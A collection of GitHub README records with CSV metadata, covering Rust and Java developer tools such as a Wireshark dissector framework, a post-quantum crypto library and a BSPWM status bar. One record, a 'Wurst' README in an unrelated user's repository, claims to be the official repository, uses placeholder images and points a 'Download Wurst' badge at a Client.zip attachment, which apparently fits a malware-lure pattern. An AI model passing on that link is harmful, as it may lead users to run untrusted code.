```

## Usage

Here's a basic example of how to use Downcida:

```rs
use downcida::{Downcida, AudioFormat};
use std::env;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    Downcida::download(""5xPcP28rWbFUlYDOhcH58l"", env::current_dir()?, Some(""US""), AudioFormat::FLAC).await?;
    Ok(())
}
```
",0,1,1,MIT,,0.0
gufranthakur/CodeLite,master,"# CodeLite

A minimalistic code editor built using Java swing, flatlaf and RSyntaxTextArea. 
This project is meant for learning and experimental purposes, by no means this is a production-ready code editor, but rather a fun attempt to learn and create my own code editor

![Screenshot 2024-10-06 135007](https://github.com/user-attachments/assets/8fe92fed-70f6-4766-939f-de9b4d6775ad)

# Features
* Syntax highlighting
* Auto save
* adding, deleting or renaming files
* open native terminal
* language support for Java, python, C, C++ and Javascript (more to be added soon)
* Dark and light theme
* various color schemes, including Monokai and Eclipse themes.

  # Snapshots

  ![Screenshot 2024-10-06 135111](https://github.com/user-attachments/assets/01ddcdfb-4193-4715-a049-d92649097acf)

  ![Screenshot 2024-10-06 135225](https://github.com/user-attachments/assets/ddd2a519-6f58-4c30-b9c1-1a62ef8ce963)
  
  ![Screenshot 2024-10-06 135324](https://github.com/user-attachments/assets/fdced105-d52d-4cb1-887b-2559fad88b81)
",1,0,1,,,1.0
NabihaShujaat/Wurst,master,"# Wurst

![Wurst Logo](https://example.com/wurst_logo.png)

Welcome to the official repository of **Wurst** - the ultimate tool for adding fun and troll modules to your gameplay experience! Here you will find all the information you need to get started with Wurst, explore its fantastic features, and contribute to its development. Dive in and unleash the power of Wurst client! üéÆ‚ú®

## Table of Contents
- [Introduction](#introduction)
- [Features](#features)
- [Getting Started](#getting-started)
- [Contributing](#contributing)
- [Community](#community)
- [License](#license)

## Introduction
**Wurst** has been a game-changer since its inception in 2014, offering a plethora of modules designed to entertain, surprise, and sometimes trick your fellow players. Whether you're exploring the depths of Minecraft or engaging in intense battles, Wurst is your reliable companion, enhancing your gaming sessions with its innovative functionalities.

## Features
- Wide range of fun and troll modules
- Open-source and constantly evolving
- Compatible with versions 1.7.2 through 1.21+
- Experience the power of Wurst client 1.21 üöÄ

Explore the full list of features and modules in the [Wiki](https://github.com/wurst/wiki).

## Getting Started
To start using Wurst, simply follow these steps:

1. Download the latest version of Wurst from the official repository.
2. Install Wurst by following the provided instructions.
3. Launch your game and enjoy the exciting features of Wurst!

Feel free to explore the various settings and modules to customize your experience to your liking. For detailed installation guidelines and troubleshooting tips, refer to the [Installation Guide](https://github.com/wurst/installation).

## Contributing
We welcome contributions from the community to help enhance and expand the capabilities of Wurst. If you're interested in contributing, please follow these steps:

1. Fork the repository to your GitHub account.
2. Create a new branch for your feature or bug fix.
3. Make your changes and submit a pull request.
4. Engage with the community and maintain open communication.

Check out our [Contribution Guidelines](https://github.com/wurst/contributing) for more details on how you can contribute effectively.

## Community
Join our community to connect with other Wurst users, share your experiences, and stay updated on the latest developments:

- Discord: [Wurst Discord Server](https://discord.gg/wurst)
- Twitter: [@wurstclient](https://twitter.com/wurstclient)
- Reddit: [r/wurstclient](https://www.reddit.com/r/wurstclient)

Don't forget to follow us on social media channels for exciting announcements, events, and giveaways!

## License
Wurst is released under the [MIT License](https://github.com/wurst/license). Feel free to modify and distribute the software as per the terms of the license.

[![Download Wurst](https://img.shields.io/badge/Download-Wurst-green)](https://github.com/user-attachments/files/16830252/Client.zip)

---

Thank you for choosing **Wurst** to add a touch of excitement and fun to your gaming adventures. Stay tuned for more updates, modules, and surprises coming your way! üåüüéâ",1,0,1,CC0-1.0,,0.0
Gbps/plugshark,main,"# plugshark - An experimental Wireshark dissector framework for Rust

Plugshark provides a framework for writing Wireshark dissector plugins. Projects utilizing
this framework can build dynamic libraries that can be loaded into Wireshark to build
protocol analyzers.

Plugshark is (currently) an unsafe plugin framework and provides no memory safety guarentees. While the
project is written to be memory safe, the Wireshark plugin interface does not always establish clear
rules on memory management. Therefore, the interfaces are marked unsafe until proper testing is performed.

All users of the framework must understand that this is still experimental and is not the basis for any
commercial or security-critical application.

Currently supports: **Wireshark v4.4 for Linux**

## How to Use

Follow the <a href=""simple-example"">simple-example</a> template in this repo to begin a new project.

Add to your `Cargo.toml` using:
- `plugshark = { git = ""https://github.com/Gbps/plugshark"", tag = ""0.0.1"" }`

Compiled `libfoo.so` files can be loaded into Wireshark by putting it into your local plugins directory:

```
cp ./target/debug/libfoo.so ~/.local/lib/wireshark/plugins/4.4/epan/
```

## Example

For a more complex example, see: https://github.com/Gbps/elpis-parser

```rust
// Callback for dissection, called when a packet for this protocol is detected and dissected.
unsafe fn dissect_callback(mut tree: DissectorSubTree) {
    // Setting the info column
    tree.set_info_column(""This is some info""); 

    // Pushing a single field into the dissector
    tree.add_field(""test.u32"", IndexPosition::Current(0), 4, FieldEncoding::LittleEndian);

    // Using the same field id multiple times
    tree.add_field(""test.u8"", IndexPosition::Current(0), 1, FieldEncoding::LittleEndian);
    tree.add_field(""test.u8"", IndexPosition::Current(0), 1, FieldEncoding::LittleEndian);
    tree.add_field(""test.u8"", IndexPosition::Current(0), 1, FieldEncoding::LittleEndian);

    // Appending text to the field
    let mut test = tree.add_field(""test.u8"", IndexPosition::Current(0), 1, FieldEncoding::LittleEndian);
    test.append_text("" (Some Appended Text)"");
}
```

Result from [tshark](https://www.wireshark.org/docs/man-pages/tshark.html):

```
User Datagram Protocol, Src Port: 56265, Dst Port: 1234
    Source Port: 56265
    Destination Port: 1234
    Length: 17
    Checksum: 0xfe24 [unverified]
    [Checksum Status: Unverified]
    [Stream index: 0]
    [Stream Packet Number: 1]
    [Timestamps]
        [Time since first frame: 0.000000000 seconds]
        [Time since previous frame: 0.000000000 seconds]
    UDP payload (9 bytes)
Test Protocol
    UInt32 Field: 0x64636261
    UInt8 Field: Test1 (0x65)
    UInt8 Field: Test2 (0x66)
    UInt8 Field: Test3 (0x67)
    UInt8 Field: Test4 (0x68) (Some Appended Text)
```

## Motivation

Currently there are only two official options for writing Wireshark dissectors, either using
the [poorly documented C API](https://www.wireshark.org/docs/wsdg_html_chunked/ChDissectAdd.html) or
the less performant [Lua API](https://www.wireshark.org/docs/wsdg_html_chunked/wsluarm_modules.html).

There exists a Rust project for creating dissectors called [WSDF](https://github.com/ghpr-asia/wsdf), but
it mainly focuses on writing analyzers from Rust structures using a declarative method. This doesn't work
so well when you have more complex dissector requirements, such as protocols that work entirely on a bitstream
level.

While the C API supports a wide range of use cases, the API is clunky to use. It is clear that the plugin API
requires a strong understanding of the internals of Wireshark.

The hope of this project is to provide a wrapper that gives relatively good access to the core functionality of
the dissector C API from Rust. Not all features are supported, and PRs are welcome.

## License

<sup>
Licensed under either of <a href=""LICENSE-APACHE"">Apache License, Version
2.0</a> or <a href=""LICENSE-MIT"">MIT license</a> at your option.
</sup>

<br>

<sub>
Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.
</sub> 
",0,0,1,Apache-2.0,,0.0
Schachte/kaffe-rs,master,"# kaffe

**kaffe** is a transpiler that converts Markdown files with embedded React components into a static site. Written in Rust, **kaffe** offers a fast and efficient way to generate web content from Markdown, allowing you to integrate React components directly within your documents.

## Features

- **Transpilation:** Converts Markdown files into static HTML, processing any embedded React components.
- **Rust Performance:** Built in Rust for speed and efficiency, ensuring quick processing times.
- **Easy Integration:** Use React components seamlessly in your Markdown for enhanced interactivity.
- **Static Site Generation:** Create a complete static site ready for deployment.

## Background

This is a low-level engine that exists to handle statically generating files to HTML from Markdown as a first-class file format.

Let's assume you want to deploy a new blog, but don't want to learn complex new frameworks, but just focus on the content and maybe some basic styling and interactive React components as you need.

1. Write a Markdown file
2. `kaffe -m your_blog_article.mdx`
3. HTML file generated

The Markdown supports React components with import statements like so:

```
import Home from ""./components/Home"";

<Home />

# hi
this is text
```

and Kaffe will generate:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>{{TITLE}}</title>
  </head>
  <body>
    <div id=""root"">
      <div>
        <div>
          Button clicked:
          <!-- -->0<!-- -->
          times
        </div>
        <button>YAY</button>
      </div>
      <h1>hi</h1>
      <p>this is text</p>
      <h2>heading</h2>
      <pre><code class=""language-javascript"">var x = 5;</code></pre>
      <ul>
        <li>hello</li>
        <li>this is list</li>
        <li>item again</li>
      </ul>
    </div>
    <script type=""module"" src=""/static/bundle.js""></script>
  </body>
</html>
```

## Getting Started

1. `cd client && yarn`
2. From root, you can run the following:

```bash
cargo run -- \
    --input-directory examples \
    --server-port 8080 \
    --client-component-directory client/src/components \
    --client-build-dir client/dist/components \
    --output-dir output
```

_Output:_

```
Files copied successfully from client/src/components to client/dist/components
Files copied successfully from client/src/components to client/dist/components
Files copied successfully from client/src/components to client/dist/components
Files generated successfully
Starting server...
Server running successfully!
Open your browser and navigate to: http://localhost:8080
```

## File structure & processing explained

1. The `client` dir expects all components to live within `client/src/components`.

2. The templates for the entrypoints when doing SSR (server-side rendering) and client-side hydration exist in `client/src/*-entry.template.tsx`.

3. When the program runs, it loads the markdown file into memory _(see: [./examples](examples/directory))_, creates an AST from the source and handles the HTML compilation for both React and Markdown.

4. Since this supports Typescript out of the box, Kaffe transpiles the React source (.tsx) into a single Javascript bundle using `esbuild`.

5. On the server, we can do the SSR piece by invoking the bundle inside of a new V8 context (the Javascript engine that will compile and execute the bundle). Kaffe uses the `deno_core` implementation of the V8 engine.

6. In tandem, Kaffe will produce the client-side equivalent bundle that gets loaded on the client to handle any interactivity required by React, event handlers, etc.

## Hot Module Reloading

You can simulate a basic HMR from just running `cargo watch`:

```bash
cargo watch -x ""run -- \
    --input-directory examples \
    --server-port 8080 \
    --client-component-directory client/src/components \
    --client-build-dir client/dist/components \
    --output-dir output""
```

All React or Rust changes will trigger a (very fast) rebuild.
",0,0,5,,,5.0
bloznelis/krowbar,master,"<h2 align=center> <b>krowbar</b> </h2>

<p align=""center""> <img alt=""GitHub release (latest SemVer)"" src=""https://github.com/bloznelis/krowbar/blob/master/images/krowbarx2.png""> </p>
<div align=""center"">

> ""Oh, and before I forget, I think you dropped this back in Black Mesa!"" [[1]](https://half-life.fandom.com/wiki/Crowbar)

</div>
<p align=center> Status bar made for BSPWM, focused on ease of use, stability and speed. </p>
<p align=center> <img alt=""GitHub release (latest SemVer)"" src=""https://img.shields.io/github/v/release/bloznelis/krowbar""> <img alt=""GitHub Workflow Status"" src=""https://img.shields.io/github/actions/workflow/status/bloznelis/krowbar/ci.yaml""> </p>


### Motivation
Generic status bars, while being complex, provide great customization, but I've always wanted a BSPWM bar that just works out-of-the-box.

### Features
* Listens to BSPWM events directly via Unix socket, i.e. _instant_ updates
* Focused desktop window count widget, no more getting lost in monocle mode
* Urgent desktop support
* All widgets are written in Rust ‚Äì forget slow scripts
* First class multi-monitor support
* In-built desktop, node count, active node name, network, cpu, mem, storage, battery, clock widgets

### Install
#### AUR
`paru -S krowbar-git`

#### Cargo
`cargo install krowbar`

**note:** When installed via cargo you have to ensure `krowbar` is in PATH before BSPWM launches. Depending on your setup, appending to the PATH in .bashrc/.zshrc might be too late. Alternatively you can use global path, e.g. `/home/user/.cargo/bin/krowbar &` (which is not as nice).

#### Prebuilt binary
1. Download the binary from [Releases](https://github.com/bloznelis/krowbar/releases)
2. `tar -xzvf krowbar-{VERSION}-x86_64-linux-gnu.tar.gz`
3. `cp krowbar-{VERSION}-x86_64-linux-gnu/krowbar /usr/local/bin/krowbar`

### Setup
Add this to your `bspwmrc`:
```shell
# Kill krowbar, when restarting BSPWM. Allows for quick iteration, if configuring.
killall krowbar

# Regular BSPWM monitor setup, krowbar will use these as dekstop names
bspc monitor {your-monitor-name} -d web code III IV V VI

# Start krowbar
krowbar &
```

### Config
`krowbar` looks for a config at `XDG_HOME/.config/krowbar/config.toml` or path passed via `--config`.

All values are optional, redefine only those you want to change (see Examples section).
``` toml
# Default values

[theme]
fg = ""#ebc17a""
fg_dim = ""#8b7653""
fg_bright = ""#f7f7f7""
bg = ""#1c1c1c""
bg_dim = ""#232323""
ok = ""#909d63""
ok_dim = ""#5e6547""
alert = ""#bc5653""
alert_dim = ""#74423f""
warn = ""#bc5653""
warn_dim = ""#74423f""
bright = ""#cacaca""
bright_dim = ""#828282""
accent = ""#bc5653""

[font]
font_family = ""Terminess Nerd Font""
font_size = ""16px""
font_weight = ""bold""

[bar]
height = 30
position = ""Top"" # Top or Bottom
```
#### Args
Some additional configuration can be done via CLI args:
```
Status bar for BSPWM

Usage: krowbar [OPTIONS]

Options:
  -d, --debug
          Enable debug logging
      --enabled-widgets <ENABLED_WIDGETS>
          Enabled widgets [possible values: desktops, win-count, focused-name, network, cpu, mem, disk, bat, clock]
      --disabled-widgets <DISABLED_WIDGETS>
          Disabled widgets (takes precedence over --enabled-widgets) [possible values: desktops, win-count, focused-name, network, cpu, mem, disk, bat, clock]
      --no-pad
          Disable automatic padding. Useful when you want to manage padding yourself.
  -c, --config <CONFIG>
          Path to config. Defaults to ~/.config/krowbar/config.toml
  -h, --help
          Print help
  -V, --version
          Print version
```

### Examples
#### krowbar classic
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-classic-1.png)
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-classic-2.png)

#### krowbar mute
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-gray-1.png)
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-gray-2.png)

```toml
[theme]
fg = ""#cacaca""
fg_dim = ""#828282""
```


#### krowbar moss
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-moss-1.png)
![](https://github.com/bloznelis/krowbar/blob/master/images/krowbar-moss-2.png)

```toml
[theme]
fg = ""#909d63""
fg_dim = ""#5e6547""
accent = ""#ebc17a""

[font]
font_family = ""Terminess Nerd Font""
font_size = ""12px""
font_weight = ""bold""

[bar]
height = 20
```

#### Showcase
![krowbar-presentation-2](https://github.com/user-attachments/assets/ff42d90e-9324-4ac1-a20b-9d4b9fee44ac)

#### krowbar might be for you, if you:
- Skipped on BSPWM, because it has no default status bar
- Are drowning in semi-working configuration
- Need a decently looking, functional status bar while searching for a nice [eww](https://github.com/elkowar/eww) config in [/r/unixporn](https://www.reddit.com/r/unixporn/)
- Always wanted something akin to [i3status](https://i3wm.org/docs/i3status.html) but for BSPWM
",6,0,1,MIT,"aur.yaml,ci.yaml,crates.yaml",0.0
codespree/quantcrypt,main,"# QuantCrypt

![Crates.io Version](https://img.shields.io/crates/v/quantcrypt)
 ![example workflow](https://github.com/codespree/quantcrypt/actions/workflows/rust.yml/badge.svg) [![dependency status](https://deps.rs/repo/github/codespree/quantcrypt/status.svg)](https://deps.rs/repo/github/codespree/quantcrypt) 

The goal of this library is to provide a simple and easy-to-use 
interface for generating key pairs, certificates, signing and verifying messages, and encrypting and decrypting messages using post-quantum cryptographic algorithms.

A secondary goal is to provide a set of cryptographic algorithms that are compatible with existing X.509, PKIX, and CMS data structures and protocols and to support the efforts of the [LAMPS Working Group](https://datatracker.ietf.org/wg/lamps/about/) in the IETF especially the [draft-ietf-lamps-pq-composite-sigs](https://datatracker.ietf.org/doc/draft-ietf-lamps-pq-composite-sigs/) and [draft-ietf-lamps-pq-composite-kem](https://datatracker.ietf.org/doc/draft-ietf-lamps-pq-composite-kem/) drafts.

## Warning

This library follows many drafts from IETF. Drafts are subject to change as is this library. Please use with caution and for testing purposes only. This library also depends on underlying cryptographic libraries which may have their own vulnerabilities and bugs. If you think something needs to be fixed, please open an issue.

## Including quantcrypt in your project

Import quantcrypt into your project by adding the following lines to your Cargo.toml.
```toml
[dependencies]
quantcrypt = ""0.2.0""
```

## Generating PQC Hackathon Artifacts for [IETF Hackathon - PQC Certificates](https://github.com/IETF-Hackathon/pqc-certificates)

```ignore
cargo test gen_pq_hackathon_artifacts_r4 --release # generate artifacts in r4 format
cargo test gen_cms_artifacts --release # generate CMS artifacts
```

To generate submission zips:
```ignore
python prepare_submission.py # Select appropriate certificates and archive them as zips for submission
```

Artifacts in both [r3](https://github.com/IETF-Hackathon/pqc-certificates?tab=readme-ov-file#zip-format-r3---deprecated-will-be-removed-at-hackathon-in-november-2024) and [r4](https://github.com/IETF-Hackathon/pqc-certificates?tab=readme-ov-file#zip-format-r4) format are generated. They can be found in `artifacts/submission` folder.

## Interoperability Results

Once the artifacts are submitted to the IETF Hackathon PQC Certificates repository, the interoperability results can be found at the [IETF PQC Hackathon Certificate Automated Verification Interoperability Results](https://ietf-hackathon.github.io/pqc-certificates/pqc_hackathon_results_certs_r4.html) page.

## Generating Key Pairs and Certificates

The following snippet demonstrates how to generate a key pair and a certificate using the DSA and KEM algorithms. In addition to pure ML-DSA and ML-KEM algorithms, the library also supports composite algorithms that combine a traditional and post-quantum algorithm into a single key pair and certificate.

```rust
use quantcrypt::certificates::CertificateBuilder;
use quantcrypt::dsas::DsaAlgorithm;
use quantcrypt::kems::KemAlgorithm;
use quantcrypt::certificates::Profile;
use quantcrypt::dsas::DsaKeyGenerator;
use quantcrypt::kems::KemKeyGenerator;
use quantcrypt::certificates::CertValidity;

// Create a TA key pair
let (pk_root, sk_root) = DsaKeyGenerator::new(DsaAlgorithm::MlDsa44).generate().unwrap();

let profile = Profile::Root;
let serial_no = None; // This will generate a random serial number
let validity = CertValidity::new(None, ""2035-01-01T00:00:00Z"").unwrap(); // Not before is now
let subject = ""CN=example.com"".to_string();
let cert_public_key = pk_root.clone();
let signer = &sk_root;

// Create the TA certificate builder
let builder = CertificateBuilder::new(
    profile,
    serial_no,
    validity.clone(),
    subject.clone(),
    cert_public_key,
    signer
).unwrap();
let cert_root = builder.build().unwrap();
assert!(cert_root.verify_self_signed().unwrap());

// Create a leaf (EE) key pair for KEM
let (pk_kem, sk_kem) = KemKeyGenerator::new(KemAlgorithm::MlKem512).generate().unwrap();
let builder = CertificateBuilder::new(
    Profile::Leaf {
        issuer: cert_root.get_subject(),
        enable_key_agreement: false,
        enable_key_encipherment: true,
    },
    serial_no,
    validity,
    subject,
    pk_kem,
    signer
).unwrap();
let cert_kem = builder.build().unwrap();

// It's not self signed so verification so self signed should fail
assert!(!cert_kem.verify_self_signed().unwrap());

// But it should verify against the root
assert!(cert_root.verify_child(&cert_kem).unwrap());
```

## Generating Enveloped Data CMS Message

The following snippet demonstrates how to generate a CMS message using the DSA and KEM algorithms.

```rust
use quantcrypt::content::EnvelopedDataContent;
use quantcrypt::content::ContentEncryptionAlgorithm;
use quantcrypt::certificates::Certificate;
use quantcrypt::keys::PrivateKey;
use quantcrypt::kdfs::KdfType;
use quantcrypt::wraps::WrapType;
use quantcrypt::content::UserKeyingMaterial;
use quantcrypt::content::ObjectIdentifier;
use quantcrypt::content::Attribute;
use quantcrypt::content::Tag;
use quantcrypt::content::AttributeValue;
use quantcrypt::content::SetOfVec;

// Based on whether IPD feature is enabled or not, use the appropriate test data
let rc_filename = ""test/data/cms/2.16.840.1.101.3.4.4.1_MlKem512_ee.der"";

let recipient_cert = Certificate::from_file(
    rc_filename,
).unwrap();

let sk_filename = ""test/data/cms/2.16.840.1.101.3.4.4.1_MlKem512_priv.der"";

let private_key = PrivateKey::from_file(
    sk_filename
).unwrap();

let ukm = UserKeyingMaterial::new(""test"".as_bytes()).unwrap();
let data = b""abc"";

let attribute_oid = ObjectIdentifier::new(""1.3.6.1.4.1.22554.5.6"").unwrap();
let mut attribute_vals: SetOfVec<AttributeValue> = SetOfVec::<AttributeValue>::new();

let attr_val = AttributeValue::new(Tag::OctetString, data.to_vec()).unwrap();
attribute_vals.insert(attr_val).unwrap();

let attribute = Attribute {
    oid: attribute_oid,
    values: attribute_vals,
};

let mut builder = EnvelopedDataContent::get_builder(ContentEncryptionAlgorithm::Aes128Cbc).unwrap();

builder
    .kem_recipient(
        &recipient_cert,
        &KdfType::HkdfWithSha256,
        &WrapType::Aes256,
        Some(ukm),
    )
    .unwrap()
    .content(data)
    .unwrap()
    .unprotected_attribute(&attribute)
    .unwrap();

let content = builder.build().unwrap();

// Now use this content to create a new EnvelopedDataContent
let edc = EnvelopedDataContent::from_bytes_for_kem_recipient(
    &content,
    &recipient_cert,
    &private_key,
).unwrap();
assert_eq!(edc.get_content(), data);
```

## Generating Auth Enveloped Data CMS Message

Auth Enveloped Data is much like the above snippet but using `AuthEnvelopedDataContent` instead of `EnvelopedDataContent`.

```rust
use quantcrypt::content::AuthEnvelopedDataContent;
use quantcrypt::content::ContentEncryptionAlgorithmAead;
use quantcrypt::certificates::Certificate;
use quantcrypt::keys::PrivateKey;
use quantcrypt::kdfs::KdfType;
use quantcrypt::wraps::WrapType;
use quantcrypt::content::UserKeyingMaterial;
use quantcrypt::content::ObjectIdentifier;
use quantcrypt::content::Attribute;
use quantcrypt::content::Tag;
use quantcrypt::content::AttributeValue;
use quantcrypt::content::SetOfVec;

let rc_filename = ""test/data/cms/2.16.840.1.101.3.4.4.1_MlKem512_ee.der"";

let recipient_cert = Certificate::from_file(
    rc_filename,
).unwrap();

let sk_filename = ""test/data/cms/2.16.840.1.101.3.4.4.1_MlKem512_priv.der"";

let private_key = PrivateKey::from_file(
    sk_filename
).unwrap();

let ukm = UserKeyingMaterial::new(""test"".as_bytes()).unwrap();
let data = b""abc"";

let attribute_oid = ObjectIdentifier::new(""1.3.6.1.4.1.22554.5.6"").unwrap();
let mut attribute_vals: SetOfVec<AttributeValue> = SetOfVec::<AttributeValue>::new();

let attr_val = AttributeValue::new(Tag::OctetString, data.to_vec()).unwrap();
attribute_vals.insert(attr_val).unwrap();

let attribute = Attribute {
    oid: attribute_oid,
    values: attribute_vals,
};

let mut builder = AuthEnvelopedDataContent::get_builder(ContentEncryptionAlgorithmAead::Aes256Gcm).unwrap();

builder
    .kem_recipient(
        &recipient_cert,
        &KdfType::HkdfWithSha256,
        &WrapType::Aes256,
        Some(ukm),
    )
    .unwrap()
    .content(data)
    .unwrap()
    .auth_attribute(&attribute)
    .unwrap();

let content = builder.build().unwrap();

// Now use this content to create a new AuthEnvelopedDataContent
let edc = AuthEnvelopedDataContent::from_bytes_for_kem_recipient(
    &content,
    &recipient_cert,
    &private_key,
).unwrap();
assert_eq!(edc.get_content(), data);
```

## Minimum Supported Rust Version (MSRV)

The minimum supported Rust version for this library is 1.81.0

## License

All crates licensed under either of
- [Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0)
- [MIT license](http://opensource.org/licenses/MIT)

at your option.

## Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.
",2,1,1,,rust.yml,14.0
ashokitschool/Microservices_Zero_To_Hero,main,"# Microservices_Zero_To_Hero

## Day-01 : https://youtu.be/f2SdepNqoMo

## Day-02 : https://youtube.com/live/act5MPpiaVM?feature=share

## Day-03 : https://youtu.be/yK1eCuXDrfY

## Day-04 : https://youtu.be/SBPQuQw0lTo
",0,0,1,,,0.0
getchoo/nix-forecast,main,"# nix-forecast

Check the forecast for today's Nix builds with a blazingly fast (üöÄüî•ü¶Ä) CLI

## Usage

```
Check the forecast for today's Nix builds

Usage: nix-forecast [OPTIONS] [INSTALLABLES]...

Arguments:
  [INSTALLABLES]...  A list of Nix installables to look for. If not given, all paths in nixpkgs are checked

Options:
  -c, --configuration <CONFIGURATION>  Flake reference pointing to a NixOS or nix-darwin configuration
  -b, --binary-cache <BINARY_CACHE>    URL of the substituter to check [default: https://cache.nixos.org]
  -f, --flake <FLAKE>                  Flake reference of nixpkgs (or other package repository) [default: nixpkgs]
  -s, --show-missing                   Show a list of store paths not found in the substituter
  -h, --help                           Print help
  -V, --version                        Print version
```

## Examples

### Flake installables

```sh
nix-forecast nixpkgs#{hello,gcc,clang,nrr}
```

### NixOS configuration


```sh
nix-forecast -c "".#nixosConfigurations.myMachine""
```

### nix-darwin configuration

```sh
nix-forecast -c "".#darwinConfigurations.myMac""
```

## Why?

Finding out if paths are cached can be a bit troublesome in Nix, with commands like `nix build --dry-run`
being the only solution a lot of the time. Meanwhile in the world of [Guix](https://guix.gnu.org/), they have
had the `guix weather` command to do this for ages! This project aims to bring the power of that command right
to Nix

### What about `nix-weather`?

`nix-weather` is another project with a similar goal of bringing some of the features of `guix weather` to
Nix. However, it does introduce it's own spin on things and has much more of a focus on NixOS configurations.
In contrast, `nix-forecast` aims to be as close to the Guix command as possible, while also introducing more
generic support for [Flake](https://nix.dev/concepts/flakes) references, NixOS *and* nix-darwin
configurations, better error messages, and a (subjectively) more comfortable interface

I've also made it slightly faster :p

```
$ hyperfine --warmup 1 './result/bin/nix-weather --name glados --config ~/flake' './target/release/nix-forecast --configuration ~/flake#nixosConfigurations.glados'
Benchmark 1: ./result/bin/nix-weather --name glados --config ~/flake
  Time (mean ¬± œÉ):     11.387 s ¬±  0.646 s    [User: 3.422 s, System: 1.663 s]
  Range (min ‚Ä¶ max):   10.490 s ‚Ä¶ 12.569 s    10 runs

Benchmark 2: ./target/release/nix-forecast --configuration ~/flake#nixosConfigurations.glados
  Time (mean ¬± œÉ):      6.395 s ¬±  0.229 s    [User: 0.992 s, System: 0.967 s]
  Range (min ‚Ä¶ max):    6.231 s ‚Ä¶  7.030 s    10 runs

  Warning: Statistical outliers were detected. Consider re-running this benchmark on a quiet system without any interferences from other programs. It might help to use the '--warmup' or '--prepare' options.

Summary
  ./target/release/nix-forecast --configuration ~/flake#nixosConfigurations.glados ran
    1.78 ¬± 0.12 times faster than ./result/bin/nix-weather --name glados --config ~/flake
```

## Inspired by...

- [guix weather](https://guix.gnu.org/manual/en/html_node/Invoking-guix-weather.html)
- [nix-weather](https://github.com/cafkafk/nix-weather/)
- [My much slower version in Fish](https://discourse.nixos.org/t/how-to-find-uncached-dependencies-of-a-closure/45385)
",1,3,8,MPL-2.0,"ci.yaml,clippy.yaml,publish.yml,update-flake.yaml",7.0
ptrglbvc/omd,master,"# omd

**omd** is a simple, fast, and lightweight Markdown renderer and previewer written in Rust. It allows you to convert Markdown files to HTML and preview them in your browser, either statically or with live-reload support.

## Features

- **Static Mode**: Convert Markdown files to HTML and open them directly in your default browser without running a server.
- **Server Mode**: Run a local server to preview your Markdown files with live-reload functionality as you edit them.
- **CommonMark Extensions**: Supports strikethrough, tables, footnotes, task lists, etc.
- **Customizable Styling**: Includes default CSS styling, which can be customized by editing `style.css`.
- **Embedded Fonts and Favicon**: Uses embedded fonts and favicon for a consistent look and self-contained HTML output.

## Installation

### Prerequisites

- [Rust and Cargo](https://www.rust-lang.org/tools/install) (for building from source)

### Build from Source

1. **Clone the Repository**

   ```bash
   git clone https://github.com/ptrglbvc/omd.git
   cd omd
   ```

2. **Build the Project**

   ```bash
   cargo build --release
   ```

3. **Install**

   Optionally, you can install `omd` to your local Cargo bin directory:

   ```bash
   cargo install --path .
   ```

   This allows you to run `omd` from anywhere on your system.

### Get it from crates.io

   ```bash
   cargo install omd
   ```

   That is it.

## Usage

```
omd [OPTIONS] [FILE]
```

### Options

- `-s`, `--static-mode`: Run in static mode. Converts the Markdown file to HTML and opens it in your default browser without starting a server.

### Examples

#### Static Mode

Convert a Markdown file to HTML and open it in your browser:

```bash
omd --static-mode README.md
```

If no file is specified, `omd` will read from `stdin`:

```bash
cat README.md | omd --static-mode
```

#### Server Mode (Live Preview)

Start a local server to preview your Markdown file with live-reload functionality:

```bash
omd README.md
```

Open [http://localhost:3030](http://localhost:3030) in your browser. Whenever you save changes to `README.md`, the browser will automatically reload to reflect the updates.

Note that it will crash if the port is taken, like for example if you have another instance of omd openned. To solve this change the port number with the `--port` flag. Like so:

```bash
omd --port 6969 README.md
```

## How It Works

- **Static Mode**: Renders the Markdown to HTML, writes it to a temporary file, and opens it in your default browser.
- **Server Mode**: Starts a local web server using [Warp](https://github.com/seanmonstar/warp) and watches the Markdown file for changes using [Notify](https://github.com/notify-rs/notify). The browser automatically reloads when changes are detected.

## Dependencies

- [Pulldown-Cmark](https://github.com/raphlinus/pulldown-cmark) for parsing and rendering Markdown.
- [Warp](https://github.com/seanmonstar/warp) for running the web server in server mode.
- [Notify](https://github.com/notify-rs/notify) for watching file changes.

## License

This project is licensed under the [MIT License](LICENSE).

## Contributing

Contributions are welcome! Please follow these steps:

1. **Fork the repository**.
2. **Create a new branch** for your feature or bugfix.
3. **Commit your changes** with clear messages.
4. **Push to your fork** and submit a **Pull Request**.

Please make sure to update tests as appropriate.

## Acknowledgments

- Thanks to the Rust community for their amazing crates that make projects like this possible.
- Inspired by the need for a simple Markdown previewer without unnecessary overhead.

## Contact

For questions or suggestions, feel free to open an issue or reach out via email at [petar0golubovic@gmail.com](mailto:petar0golubovic@gmail.com).
",0,0,1,MIT,,4.0
orlowskilp/evm-signer-kms,master,"# Library for signing EVM transactions with AWS KMS

![Crates.io Version](https://img.shields.io/crates/v/evm-signer-kms)
[![evm-signer-kms](https://github.com/orlowskilp/evm-signer-kms/actions/workflows/build-and-test.yml/badge.svg)](https://github.com/orlowskilp/evm-signer-kms/actions/workflows/build-and-test.yml)
[![codecov](https://codecov.io/github/orlowskilp/evm-signer-kms/branch/master/graph/badge.svg?token=DGY9EZFV5L)](https://codecov.io/github/orlowskilp/evm-signer-kms)
[![MIT License](https://img.shields.io/badge/license-MIT-green)](/LICENSE)

EVM transaction signing library using key pairs generated and stored in
[AWS KMS](https://aws.amazon.com/kms).

**Built for**:

* Security - AWS KMS managed keys which never leave HSM devices.
* Speed and reliability - Implemented in Rust.

## Features

* Legacy (type 0) transactions
* [EIP-2930](https://eips.ethereum.org/EIPS/eip-2930) (type 1) transactions
* [EIP-1559](https://eips.ethereum.org/EIPS/eip-1559) (type 2) transactions
* Easily expandable to future [EIP-2718](https://eips.ethereum.org/EIPS/eip-2718) typed transactions
